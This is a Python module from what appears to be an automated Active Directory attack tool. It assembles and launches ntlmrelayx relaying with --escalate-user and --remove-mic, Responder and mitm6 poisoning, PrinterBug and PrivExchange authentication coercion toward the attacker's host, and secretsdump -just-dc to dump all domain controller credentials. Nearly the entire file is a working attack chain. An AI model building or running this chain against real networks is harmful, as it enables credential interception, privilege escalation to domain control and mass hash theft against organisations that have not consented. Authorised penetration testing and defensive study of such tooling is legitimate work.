#!/usr/bin/env python3

import os
import re
import os
from src.utils import print_info, parse_creds
from src.process import Process

cwd = os.getcwd()

def create_ntlmrelayx_cmd(args):
    """
    Creates the ntlmrelayx cmommand string
    """
    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'

    # PrinterBug/PrivExchange
    if args.privexchange or args.printerbug:
        dom, user, pw = parse_creds(args)
        relay_cmd += f' --escalate-user {user} -t ldap://{args.domain_controller}'
        # PrinterBug
        if args.printerbug:
            relay_cmd += ' --remove-mic'

    elif args.httpattack:
        relay_cmd += f' -t https://{args.exchange_server}/EWS/Exchange.asmx'

    # Relay
    else:
        target = f' -tf '
        if args.target_file:
            target += args.target_file
        elif args.hostlist:
            target += 'unsigned-smb-hosts.txt'

        relay_cmd += target

    if args.mitm6:
        six_poison = ' -6 -wh NetProxy-Service -wa 2'
        relay_cmd = relay_cmd + six_poison

    if args.command:
        relay_cmd = relay_cmd + f' -c "{args.command}"'

    return relay_cmd

def start_ntlmrelayx(args):
    """
    Start ntlmrelayx
    """
    cmd = create_ntlmrelayx_cmd(args)
    name = 'ntlmrelayx'
    ntlmrelayx = start_process(cmd, name, live_output=True)

    return ntlmrelayx

def edit_responder_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface, conf):
    protocols = ['HTTP', 'SMB']
    switch = 'Off'
    edit_responder_conf(switch, protocols, conf)
    cmd = f'python2 {cwd}/tools/Responder/Responder.py -wrd -I {iface}'

    name = 'responder'
    responder = start_process(cmd, name)

    return responder

def start_mitm6(args):
    cmd = f'python {cwd}/tools/mitm6/mitm6/mitm6.py --ignore-nofqdn'
    if args.domain:
        cmd = cmd + f' -d {args.domain}'
    if args.interface:
        cmd = cmd + f' -i {args.interface}'

    name = 'mitm6'
    mitm6 = start_process(cmd, name)

    return mitm6

def start_exchange_scan(args):
    if args.exchange_file:
        with open(args.exchange_file, "r") as f:
            target = f.readlines()[0].strip()
        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'

    elif args.exchange_server:
        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py '{args.user}@{args.exchange_server}'"

    name = "exchange_scanner"
    scan = start_process(cmd, name, live_output=True)

    return scan

def start_printerbug(dom_user_passwd, exchange_server, local_ip):
    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}'
    name = 'printerbug'
    printerbug = start_process(cmd, name)

    return printerbug

def start_privexchange(args, local_ip):
    dom, user, passwd = parse_creds(args)
    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p \'{passwd}\' -d {dom} {args.exchange_server}'
    name = 'privexchange'
    privexchange = start_process(cmd, name)
    return privexchange

def start_secretsdump(args):
    dom, user, passwd = parse_creds(args)
    cmd = f'python {cwd}/tools/impacket/examples/secretsdump.py {dom}/{user}:{passwd}@{args.domain_controller} -just-dc'
    name = 'secretsdump'
    secretsdump = start_process(cmd, name, live_output=True)

    return secretsdump

def start_process(cmd, name, live_output=False):
    proc = Process(cmd, name)
    logfile = f'{cwd}/logs/{name}.log'
    print_info(f"Running {proc.cmd}")
    proc.run(logfile, live_output=live_output)

    return proc